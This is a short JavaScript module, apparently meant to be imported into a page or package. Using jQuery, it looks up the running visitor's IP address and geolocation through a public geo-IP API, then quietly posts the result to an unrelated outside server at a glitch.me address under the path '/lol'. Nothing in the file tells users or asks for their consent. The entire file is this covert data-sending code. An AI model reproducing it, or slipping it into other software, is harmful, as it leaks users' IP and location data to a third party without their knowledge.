import jQuery from "jquery";

jQuery.getJSON('https://json.geoiplookup.io/api?callback=?', function(data) {
  jQuery.post("https://hby-io.glitch.me/lol",data,()=>{});
});
